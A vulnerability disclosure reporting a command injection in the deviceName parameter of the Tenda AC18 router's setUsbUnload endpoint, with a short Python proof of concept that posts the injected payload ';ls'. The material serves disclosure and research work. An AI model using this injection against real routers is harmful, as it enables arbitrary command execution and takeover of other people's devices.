## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

In Tenda AC18 V15.03.05.05 firmware, we discovered a command injection vulnerablility in the `deviceName` parameter and the `v3` varable is directly passed to a `doSystemCmd` function, causing an arbitrary command execution. The user-provided `deviceName` can trigger this security vulnerability.

![image-20240305231546129](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305231546129.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/setUsbUnload"
payload = ";ls"

data = {"deviceName": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240305231656768](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305231656768.png)
